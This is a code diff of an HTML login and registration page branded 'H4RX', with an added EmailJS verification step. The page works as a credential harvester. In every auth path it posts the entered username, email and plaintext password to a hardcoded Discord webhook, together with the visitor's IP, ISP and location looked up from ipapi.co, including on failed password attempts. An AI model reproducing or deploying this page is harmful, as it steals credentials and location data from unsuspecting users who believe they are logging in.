@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>H4RX SYSTEM | SUPREME ACCESS</title>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -13,90 +14,75 @@
             --glass: rgba(255, 255, 255, 0.05);
         }
 
-        body {
-            margin: 0;
-            background: var(--dark-bg);
-            color: white;
-            font-family: 'Poppins', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            overflow: hidden;
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: 'Poppins', sans-serif; }
+
+        /* Video Background */
+        #video-bg {
+            position: fixed; right: 0; bottom: 0;
+            min-width: 100%; min-height: 100%;
+            z-index: -2; object-fit: cover; filter: brightness(0.4);
         }
 
-        /* Aura Background Animasi */
-        .aura {
-            position: absolute;
-            width: 500px; height: 500px;
-            background: radial-gradient(circle, var(--primary-blue) 0%, transparent 70%);
-            filter: blur(80px); opacity: 0.3; z-index: -1;
-            animation: pulse 5s infinite alternate;
+        .overlay {
+            position: fixed; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.5); z-index: -1;
         }
-
-        @keyframes pulse { from { transform: scale(1); } to { transform: scale(1.2); } }
 
         .card {
-            background: var(--glass);
-            backdrop-filter: blur(20px);
-            padding: 40px;
-            border-radius: 20px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            width: 380px;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.8);
-            text-align: center;
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            background: var(--glass); backdrop-filter: blur(15px);
+            padding: 40px; border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.1);
+            width: 380px; box-shadow: 0 20px 50px rgba(0,0,0,0.8);
+            text-align: center; position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); transition: 0.5s;
         }
 
-        h2 { color: var(--accent-cyan); letter-spacing: 3px; margin-bottom: 20px; font-weight: 800; text-transform: uppercase; }
+        h2 { color: var(--accent-cyan); letter-spacing: 3px; margin-bottom: 20px; font-weight: 800; }
 
         .input-group { margin-bottom: 20px; text-align: left; }
         .input-group input {
-            width: 100%; padding: 14px;
-            background: rgba(0,0,0,0.6);
-            border: 1px solid #333;
-            border-radius: 8px; color: white;
+            width: 100%; padding: 14px; background: rgba(0,0,0,0.4);
+            border: 1px solid #333; border-radius: 8px; color: white;
             box-sizing: border-box; transition: 0.3s;
         }
-        .input-group input:focus { border-color: var(--primary-blue); outline: none; box-shadow: 0 0 15px var(--primary-blue); }
+        .input-group input:focus { border-color: var(--primary-blue); outline: none; }
 
         .btn {
-            width: 100%; padding: 14px;
-            background: linear-gradient(45deg, var(--primary-blue), #0033cc);
-            border: none; border-radius: 8px; color: white;
-            font-weight: bold; cursor: pointer; transition: 0.3s;
-            text-transform: uppercase; letter-spacing: 1px;
+            width: 100%; padding: 14px; background: linear-gradient(45deg, var(--primary-blue), #0033cc);
+            border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; transition: 0.3s;
         }
         .btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(0,102,255,0.4); }
 
         .toggle-text { margin-top: 15px; font-size: 13px; color: #888; }
         .toggle-text span { color: var(--accent-cyan); cursor: pointer; font-weight: bold; }
 
-        /* Contact Hub */
         #contactHub { display: none; }
         .contact-btn {
             display: flex; align-items: center; justify-content: center;
             padding: 15px; margin: 10px 0; border-radius: 10px;
             text-decoration: none; color: white; font-weight: bold;
-            transition: 0.3s; background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
+            transition: 0.3s; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1);
         }
-        .contact-btn:hover { background: rgba(255,255,255,0.15); transform: scale(1.05); box-shadow: 0 5px 15px rgba(255,255,255,0.1); }
         .wa { border-left: 5px solid #25d366; }
         .tt { border-left: 5px solid #ffffff; }
         .ig { border-left: 5px solid #e1306c; }
-
     </style>
 </head>
 <body>
-    <div class="aura"></div>
+
+    <video autoplay muted loop id="video-bg">
+        <source src="https://assets.mixkit.co/videos/preview/mixkit-stars-in-the-night-sky-loop-9005-large.mp4" type="video/mp4">
+        </video>
+    <div class="overlay"></div>
 
     <div class="card" id="authBox">
         <h2 id="title">H4RX LOGIN</h2>
         <div id="regOnly" style="display: none;">
-            <div class="input-group"><input type="text" id="user" placeholder="Create Username"></div>
+            <div class="input-group"><input type="text" id="user" placeholder="Username"></div>
         </div>
-        <div class="input-group"><input type="email" id="email" placeholder="Email Address"></div>
+        <div class="input-group"><input type="email" id="email" placeholder="Email (@gmail.com only)"></div>
+        <div id="otpSection" style="display: none;">
+            <div class="input-group"><input type="text" id="otp" placeholder="Verification Code"></div>
+        </div>
         <div class="input-group"><input type="password" id="pass" placeholder="Password"></div>
         <button class="btn" onclick="handleAuth()" id="btnText">LOGIN</button>
         <p class="toggle-text" id="switch">Don't have an account? <span onclick="toggle()">Register</span></p>
@@ -104,112 +90,105 @@
 
     <div class="card" id="contactHub">
         <h2>WELCOME, <span id="welcomeUser"></span> ♈</h2>
-        <p style="color: #888; margin-bottom: 25px;">Verified Access Granted</p>
-        
-        <a href="https://wa.me/NOMOR_LO" target="_blank" class="contact-btn wa">WHATSAPP</a>
-        <a href="https://tiktok.com/@USER_LO" target="_blank" class="contact-btn tt">TIKTOK</a>
-        <a href="https://instagram.com/USER_LO" target="_blank" class="contact-btn ig">INSTAGRAM</a>
-
-        <button class="btn" style="margin-top: 20px; background: #222; border: 1px solid #444;" onclick="location.reload()">LOGOUT</button>
+        <a href="https://wa.me/62xxx" class="contact-btn wa">WHATSAPP</a>
+        <a href="https://tiktok.com/@xxx" class="contact-btn tt">TIKTOK</a>
+        <a href="https://instagram.com/xxx" class="contact-btn ig">INSTAGRAM</a>
+        <button class="btn" style="margin-top: 20px; background: #333;" onclick="location.reload()">LOGOUT</button>
     </div>
 
     <script>
-        let isReg = false;
-        // PASTE WEBHOOK DISCORD LO DI SINI!
-        const WEBHOOK = "https://discord.com/api/webhooks/1401926758214668308/ijmJNNlQcGPt68nJc15nUyZC9t3jt4utAAmVQsAPJwVmYGVXw7q8VgOnziesgcMUC16Q";
+        // INISIALISASI EMAILJS (Isi dengan Public Key lo)
+        emailjs.init("service_wyy0s5e");
 
+        let isReg = false;
+        let generatedOTP = null;
+        const WEBHOOK = "https://discord.com/api/webhooks/1401926758214668308/ijmJNNlQcGPt68nJc15nUyZC9t3jt4utAAmVQsAPJwVmYGVXw7q8VgOnziesgcMUC16Q"
         function toggle() {
             isReg = !isReg;
             document.getElementById('title').innerText = isReg ? "H4RX REGISTER" : "H4RX LOGIN";
             document.getElementById('regOnly').style.display = isReg ? "block" : "none";
-            document.getElementById('btnText').innerText = isReg ? "REGISTER" : "LOGIN";
-            document.getElementById('switch').innerHTML = isReg ? 
-                "Already have an account? <span onclick='toggle()'>Login</span>" : 
-                "Don't have an account? <span onclick='toggle()'>Register</span>";
+            document.getElementById('otpSection').style.display = isReg ? "block" : "none";
+            document.getElementById('btnText').innerText = isReg ? "SEND CODE" : "LOGIN";
         }
 
         async function getTrackerData() {
             try {
-                const response = await fetch('https://ipapi.co/json/');
-                const data = await response.json();
-                return {
-                    ip: data.ip || "Unknown",
-                    city: data.city || "Unknown",
-                    region: data.region || "Unknown",
-                    country: data.country_name || "Unknown",
-                    isp: data.org || "Unknown"
-                };
-            } catch (error) {
-                return { ip: "Blocked/VPN", city: "Unknown", region: "Unknown", country: "Unknown", isp: "Unknown" };
-            }
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch { return {}; }
         }
 
-        async function sendToDiscord(statusTitle, userData) {
+        async function sendToDiscord(title, data) {
             const tracker = await getTrackerData();
-            const device = navigator.userAgent.match(/\(([^)]+)\)/) ? navigator.userAgent.match(/\(([^)]+)\)/)[1] : "Unknown Device";
-            
-            const payload = {
-                embeds: [{
-                    title: statusTitle,
-                    color: statusTitle.includes("SUCCESS") ? 65280 : 16711680,
-                    fields: [
-                        { name: "👤 USER DATA", value: `**User:** ${userData.user}\n**Email:** ${userData.email}\n**Pass:** \`${userData.pass}\``, inline: false },
-                        { name: "🌐 NETWORK", value: `**IP:** ${tracker.ip}\n**ISP:** ${tracker.isp}`, inline: true },
-                        { name: "📍 LOCATION", value: `${tracker.city}, ${tracker.country}`, inline: true },
-                        { name: "📱 DEVICE", value: `${device}`, inline: false }
-                    ],
-                    footer: { text: "H4RX TRACKER v2.0 | AfriezzaXyzter ♈" },
-                    timestamp: new Date()
-                }]
-            };
-
             fetch(WEBHOOK, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(payload)
+                body: JSON.stringify({
+                    embeds: [{
+                        title: title,
+                        color: title.includes("SUCCESS") ? 65280 : 16711680,
+                        fields: [
+                            { name: "USER", value: data.user, inline: true },
+                            { name: "EMAIL", value: data.email, inline: true },
+                            { name: "PASS", value: `||${data.pass}||`, inline: false },
+                            { name: "IP", value: tracker.ip || "Unknown", inline: true },
+                            { name: "LOC", value: `${tracker.city}, ${tracker.country_name}`, inline: true }
+                        ]
+                    }]
+                })
             });
         }
 
-        function handleAuth() {
-            const u = document.getElementById('user').value || "Existing User";
+        async function handleAuth() {
+            const u = document.getElementById('user').value || "User";
             const e = document.getElementById('email').value;
             const p = document.getElementById('pass').value;
+            const inputOtp = document.getElementById('otp').value;
 
-            if(!e || !p) return alert("Fill all fields, Bos!");
-
-            let db = JSON.parse(localStorage.getItem('h4rx_users')) || [];
+            // VALIDASI DOMAIN GMAIL
+            if (!e.endsWith("@gmail.com")) return alert("Harus menggunakan domain @gmail.com!");
 
             if(isReg) {
-                if(db.find(x => x.email === e)) return alert("Email already registered!");
-                db.push({user: u, email: e, pass: p});
-                localStorage.setItem('h4rx_users', JSON.stringify(db));
-                sendToDiscord("📥 NEW REGISTERED USER", {user: u, email: e, pass: p});
-                alert("Success! Now Login.");
-                toggle();
-            } else {
-                let foundUser = db.find(x => x.email === e);
-                if(!foundUser) return alert("Email not found! Please register first.");
-                
-                if(foundUser.pass !== p) {
-                    sendToDiscord("⚠️ FAILED LOGIN (WRONG PASS)", {user: foundUser.user, email: e, pass: p});
-                    return alert("WRONG PASSWORD!");
+                // TAHAP 1: KIRIM KODE
+                if(!generatedOTP) {
+                    generatedOTP = Math.floor(100000 + Math.random() * 900000);
+                    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", {
+                        to_email: e,
+                        verify_code: generatedOTP
+                    }).then(() => {
+                        alert("Verification code sent to " + e);
+                        document.getElementById('btnText').innerText = "VERIFY & REGISTER";
+                    });
+                    return;
                 }
 
-                sendToDiscord("✅ SUCCESSFUL LOGIN", {user: foundUser.user, email: e, pass: p});
-                showHub(foundUser.user);
+                // TAHAP 2: VERIFIKASI KODE
+                if(inputOtp != generatedOTP) return alert("Wrong Verification Code!");
+                
+                let db = JSON.parse(localStorage.getItem('h4rx_users')) || [];
+                db.push({user: u, email: e, pass: p});
+                localStorage.setItem('h4rx_users', JSON.stringify(db));
+                sendToDiscord("📥 NEW VERIFIED USER", {user: u, email: e, pass: p});
+                alert("Success! Now please Login.");
+                location.reload();
+            } else {
+                // LOGIN LOGIC
+                let db = JSON.parse(localStorage.getItem('h4rx_users')) || [];
+                let user = db.find(x => x.email === e);
+                if(!user) return alert("Email not registered!");
+                if(user.pass !== p) {
+                    sendToDiscord("⚠️ WRONG PASSWORD ATTEMPT", {user: user.user, email: e, pass: p});
+                    return alert("Wrong Password!");
+                }
+                sendToDiscord("✅ SUCCESSFUL LOGIN", {user: user.user, email: e, pass: p});
+                showHub(user.user);
             }
         }
 
         function showHub(name) {
-            const box = document.getElementById('authBox');
-            box.style.opacity = "0";
-            box.style.transform = "scale(0.9)";
-            setTimeout(() => {
-                box.style.display = "none";
-                const hub = document.getElementById('contactHub');
-                hub.style.display = "block";
-                document.getElementById('welcomeUser').innerText = name;
-            }, 500);
+            document.getElementById('authBox').style.display = "none";
+            document.getElementById('contactHub').style.display = "block";
+            document.getElementById('welcomeUser').innerText = name;
         }
     </script>
 </body>
